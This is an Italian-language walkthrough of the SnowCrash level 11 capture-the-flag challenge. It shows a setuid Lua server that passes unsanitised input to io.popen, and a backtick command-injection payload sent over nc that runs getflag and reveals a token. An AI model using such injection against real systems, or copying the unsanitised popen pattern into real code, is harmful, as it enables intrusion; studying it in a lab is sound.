# Level11
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
```
troviamo uno script lua con al suo interno il seguente codice:
```lua
 1  #!/usr/bin/env lua
 2  local socket = require("socket")
 3  local server = assert(socket.bind("127.0.0.1", 5151))
 4  function hash(pass)
 5    prog = io.popen("echo "..pass.." | sha1sum", "r")
 6    data = prog:read("*all")
 7    prog:close()
 8    data = string.sub(data, 1, 40)
 9    return data
10  end

11  while 1 do
12    local client = server:accept()
13    client:send("Password: ")
14    client:settimeout(60)
15    local l, err = client:receive()
16    if not err then
17        print("trying " .. l)
18        local h = hash(l)
19        if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
20            client:send("Erf nope..\n");
21        else
22            client:send("Gz you dumb*\n")
23        end
24    end
25    client:close()
26  end
```
Lo script si connette alla porta `5151` analizzando la password che gli viene passata
e la prima cosa importante che possiamo notare è l'utilizzo dell'input in `popen`
senza alcun controllo, quindi quindi basterà inserire un comando eseguibile in bash.
Eseguendo lo script ci avvisa che la porta è già occupata, in effetti con il comando
`netstat -tulpn | grep LISTEN` abbiamo il seguente output:
```
tcp        0      0 0.0.0.0:4646            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:4747            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::4242                 :::*                    LISTEN      -
```
Quindi lo script è già avviato e in ascolto sulla porta `5151`

### 2 passaggio
Avviamo nc con `nc localhost 5151` e nell'input scriviamo ``getflag` > /tmp/flag_11`
```bash
level11@SnowCrash:~$ nc localhost 5151
Password: `getflag` > /tmp/flag_11
Erf nope..
```
e con `cat /tmp/flag_11` abbiamo:
```bash
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
